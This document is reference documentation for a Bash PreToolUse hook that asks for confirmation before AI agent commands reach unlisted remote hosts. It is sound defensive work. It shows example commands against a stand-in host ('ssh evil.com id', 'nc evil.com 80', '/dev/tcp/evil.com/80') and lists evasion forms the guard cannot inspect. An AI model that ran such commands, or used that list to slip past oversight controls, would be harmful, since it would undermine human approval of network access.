---
title: remote-host-guard
description: Choose which remote hosts a Bash command may reach without a prompt, and see what the guard asks about.
---

# remote-host-guard

The remote-host guard is a PreToolUse hook on Bash.
It prompts for confirmation before a command reaches a remote host the project has not listed.
The guard never denies a command on its own decision; it only asks.
It blocks only when it cannot run (see [Failing closed](#failing-closed)).
The hook and the manifest key exist only when `remoteHosts` is set.

To configure allowed hosts, declare `remoteHosts` in `.configs/vulcan.config.mts`:

```ts
import type { VulcanConfig } from '@venizia/vulcan';

export default {
  remoteHosts: {
    trusted: ['lab1', '*.lab.example.com'],
    readOnly: ['prod1', 'prod1.*'],
    localFile: '.agents/hooks/trusted-hosts.local',
  },
} satisfies VulcanConfig;
```

A command targeting a trusted host executes without prompting.
The hook prints nothing and exits 0:

```text
$ echo '{"tool_name":"Bash","tool_input":{"command":"ssh lab1 uptime"}}' | bun node_modules/@venizia/vulcan/base/hooks/guard-remote-hosts.ts
```

A command targeting an unlisted host prompts for confirmation:

```text
$ echo '{"tool_name":"Bash","tool_input":{"command":"ssh evil.com id"}}' | bun node_modules/@venizia/vulcan/base/hooks/guard-remote-hosts.ts
{"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"ask","permissionDecisionReason":"This command may reach a remote host the project has not listed:\n  - reaching 'evil.com', which is not in remoteHosts.trusted (list it there, or in .agents/hooks/trusted-hosts.local for yourself); a remoteHosts.readOnly host passes only the strict read-only forms\n\nRead on the host, never edit, restart or copy onto it. Produce the command and hand it over."}}
```

## Host lists

`remoteHosts` defines three host lists:

| Option | Type | Default | Meaning |
|---|---|---|---|
| `trusted` | `string[]` | `[]` | Host names or patterns permitted for any command |
| `readOnly` | `string[]` | `[]` | Host names or patterns permitted only for strict read-only commands |
| `localFile` | `string` | `'.agents/hooks/trusted-hosts.local'` | Path to a personal uncommitted list of trusted hosts |

`localFile` stores personal trusted hosts outside repository version control.
Add the file path to `.gitignore`.
The file lists one host per line.
Empty lines are ignored, and `#` characters mark comments.

To register the hook and render the policy into the manifest, run `vulcan sync`:

```text
$ bun x --no-install vulcan sync
  unchanged CLAUDE.md
  replaced  .claude/settings.json (shipped, slot, project hooks and claude.settings over personal keys)
  replaced  .claude/skills/build-a-feature
  replaced  .claude/skills/docs-update
  replaced  .claude/skills/knowledge-sync
  replaced  .claude/skills/docs-writing
  replaced  .agents/vulcan.manifest.json
```

`vulcan sync` writes the `guard-remote-hosts.ts` hook into `.claude/settings.json`.
It also writes the resolved policy into `.agents/vulcan.manifest.json`.

## How hosts are matched

Hosts are compared by whole name or a `*` pattern.
Matching is case-insensitive.
The guard never performs substring matches against commands, arguments, users, or paths.

The wildcard `*` matches only within host characters (`[a-z0-9._-]`).
It never spans across users, ports, or directory separators.
An entry containing an environment variable like `$VAR` or `${VAR}` matches the same unexpanded shell token.

Configuration rejects entries containing usernames, paths, or port numbers.

| Entry | Matches | Does not match |
|---|---|---|
| `lab1` | `lab1`, `LAB1` | `lab1.evil.com`, `evil-lab1`, `lab1@evil.com`, `lab10` |
| `*.lab.example.com` | `a.lab.example.com`, `a.b.lab.example.com` | `lab.example.com`, `a.lab.example.com.evil.com` |
| `prod1` | `prod1` | `prod1.corp.example` (use `prod1.*`) |
| `$LAB_HOST` | `$LAB_HOST`, `${LAB_HOST}` | `$other` |

## Which commands are read

The guard inspects command structures across multiple client programs and execution doors.
Commands follow shell keywords such as `do`, `then`, `else`, `if`, `while`, `until` and `{`.
Loop and condition bodies are read.
Flags `-o ProxyJump` and `-J` are parsed as hosts and checked against the lists.

The following table demonstrates how the guard handles each door when tested against `lab1` (trusted), `evil.com` (unlisted), and `prod1` (readOnly):

| Door | Example | Result |
|---|---|---|
| SSH client | `ssh lab1 uptime` | Passes |
| SSH client | `ssh evil.com id` | Prompts |
| SFTP client | `sftp lab1` | Passes |
| SFTP client | `sftp evil.com` | Prompts |
| Mosh client | `mosh evil.com` | Prompts |
| File copy | `scp ./build.tgz lab1:/srv/` | Passes |
| File copy | `scp f evil.com:/tmp/lab1` | Prompts |
| Rsync transfer | `rsync -avz ./dist/ lab1:/srv/app/` | Passes |
| Rsync transfer | `rsync -a ./x evil.com:/srv/lab1/` | Prompts |
| Kubernetes | `kubectl --context lab1 get pods` | Passes |
| Kubernetes | `kubectl --context evil get pods` | Prompts |
| Kubernetes | `kubectl get pods` | Prompts |
| Kubernetes tools | `helm --kube-context evil list` | Prompts |
| Kubernetes tools | `k9s --context evil` | Prompts |
| Docker daemon | `docker -H ssh://lab1 ps` | Passes |
| Docker daemon | `docker -H ssh://evil.com ps` | Prompts |
| Docker context | `docker --context prod ps` | Prompts |
| Network client | `nc lab1 22` | Passes |
| Network client | `nc evil.com 80` | Prompts |
| Telnet client | `telnet evil.com 25` | Prompts |
| HTTP client | `curl https://example.com/data.json` | Passes |
| Network device path | `cat < /dev/tcp/lab1/80` | Passes |
| Network device path | `cat < /dev/tcp/evil.com/80` | Prompts |
| Repository clone URL | `git clone ssh://git@evil.com/x.git` | Prompts |
| Command wrapper | `sudo ssh lab1 uptime` | Passes |
| Command wrapper | `sudo ssh evil.com` | Prompts |
| Environment wrapper | `env FOO=1 ssh evil.com` | Prompts |
| Execution wrapper | `xargs -n1 ssh < hosts.txt` | Prompts |
| Nested shell | `bash -c "ssh lab1 uptime"` | Passes |
| Nested shell | `bash -c "ssh evil.com"` | Prompts |
| Shell eval | `eval "ssh evil.com"` | Prompts |
| Find execution | `find . -exec ssh evil.com {} \;` | Prompts |
| Shell loop | `for h in lab1 prod1; do ssh $h id; done` | Prompts |
| Shell conditional | `if ssh lab1 id; then echo ok; fi` | Passes |
| Shell conditional | `if ssh evil.com id; then echo ok; fi` | Prompts |
| Nested remote command | `ssh lab1 "ssh prod1 uptime"` | Passes |
| Nested remote command | `ssh lab1 "ssh evil.com id"` | Prompts |
| Piped shell | `bash <<< "ssh evil.com"` | Prompts |
| Connection redirection | `GIT_SSH_COMMAND`, `GIT_SSH`, `RSYNC_RSH`, `DOCKER_HOST`, `DOCKER_CONTEXT`, `KUBECONFIG`, `core.sshCommand` | Prompts |

## What cannot be read asks

When a command hides its target host behind dynamic evaluation, the guard prompts for confirmation:

- Command substitutions: `$(...)` and backticks evaluate destinations at runtime, such as `ssh $(cat /tmp/h)`.
- Proxy and command options: `-o ProxyCommand`, `-o LocalCommand`, and `-o KnownHostsCommand` always ask. Options `-F` and `-S` always ask, as do `mosh --ssh`, `mosh --server`, and `ssh-keyscan -f`.
- Ambient Kubernetes contexts: `kubectl`, `helm`, `k9s`, and `oc` ask without `--context` or a similar target option. Passing `--kubeconfig` asks for all four tools.
- Docker contexts: `docker --context`, `docker -c`, and `docker context` ask because contexts resolve outside inspected commands.
- Unlisted variables: `$VAR` references not declared in `remoteHosts` or `localFile` cannot be resolved statically.
- Unparsed clients: clients whose target the guard does not parse always ask, such as `autossh`, `pssh`, `pscp`, `socat`, `ansible`.
- Standard input shells: shells reading from pipes, heredocs, or `-s` can receive uninspected commands.
- Unreadable hook input: if the hook input cannot be read, the guard asks ("the hook input could not be read").

In shell loops, variables expand at runtime and cannot be verified in advance:

```text
$ echo '{"tool_name":"Bash","tool_input":{"command":"for h in lab1 prod1; do ssh $h id; done"}}' | bun node_modules/@venizia/vulcan/base/hooks/guard-remote-hosts.ts
{"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"ask","permissionDecisionReason":"This command may reach a remote host the project has not listed:\n  - reaching '$h', which is not in remoteHosts.trusted (list it there, or in .agents/hooks/trusted-hosts.local for yourself); a remoteHosts.readOnly host passes only the strict read-only forms\n\nRead on the host, never edit, restart or copy onto it. Produce the command and hand it over."}}
```

A shell receiving commands through a pipe prompts because any command could execute:

```text
$ echo '{"tool_name":"Bash","tool_input":{"command":"echo hi | sh"}}' | bun node_modules/@venizia/vulcan/base/hooks/guard-remote-hosts.ts
{"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"ask","permissionDecisionReason":"This command may reach a remote host the project has not listed:\n  - the target of this command cannot be read (sh runs commands it reads from its input), so any host could be reached\n\nRead on the host, never edit, restart or copy onto it. Produce the command and hand it over."}}
```

## readOnly hosts

Hosts listed under `readOnly` permit only strict read-only command forms.
The guard asks if the command uses a redirect or any `ssh` option (`ssh -p 2222 prod1 uptime`).
It asks if the remote command falls outside the fixed list.
It also asks if another command in the line reaches that host and is not strict.

A local command does not ask (`ssh prod1 uptime; rm -rf /tmp/x` passes).
A pipe into a local command passes (`ssh prod1 uptime | grep load`).
HTTP clients stay silent for hosts in neither list and ask for a readOnly host.

| Form | Passes |
|---|---|
| `ssh <host> <command>` | No ssh options; one of these remote commands: `uptime`, `hostname`, `df -h`, `free -m`, `docker ps` (optional `-a`), `docker compose ps`, `ls [flags] <path>` (optional single flag group), `cat <path>`, `tail -n <N> <path>`, `systemctl status <unit>` (optional `--no-pager`), `journalctl -u <unit> -n <N> --no-pager`, `docker logs --tail <N> <unit>`. Every `<path>` must be absolute. |
| `scp [flags] <host>:<source> <target>` | Flags restricted to `-[rpqC]+`; source must be an absolute remote path, target must be a relative local path |
| `rsync [flags] <host>:<source> <target>` | Flags restricted to `-[avzrhPt]+`; source must be an absolute remote path, target must be a relative local path |
| `kubectl --context <host> <verb>` | Read verbs: `get`, `describe`, `logs`, `top` |

When a command attempts to modify a `readOnly` host, the guard prompts:

```text
$ echo '{"tool_name":"Bash","tool_input":{"command":"ssh prod1 systemctl restart nginx"}}' | bun node_modules/@venizia/vulcan/base/hooks/guard-remote-hosts.ts
{"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"ask","permissionDecisionReason":"This command may reach a remote host the project has not listed:\n  - 'prod1' is a remoteHosts.readOnly host: only a strict read-only form passes (uptime, df -h, cat <path>, scp/rsync from it, kubectl get|describe|logs|top), and this command is not one\n\nRead on the host, never edit, restart or copy onto it. Produce the command and hand it over."}}
```

## Failing closed

Claude Code blocks a PreToolUse call only when the hook exits with code 2.
The remote-host guard fails closed on every operational error:

- If `node_modules/@venizia/vulcan` is missing, execution halts with exit code 2. Run `bun install` to restore dependencies.
- If `bun` is missing from `PATH`, execution halts with exit code 2. Put Bun on `PATH`.
- If `.agents/vulcan.manifest.json` is missing, the hook exits with code 2. Run `vulcan sync` to generate the manifest.
- If `.agents/vulcan.manifest.json` lacks the `remoteHosts` key, the hook exits with code 2. Run `vulcan sync` to write the policy.

## See also

- [Hooks](/references/hooks/)
- [Configuration](/references/configuration/)
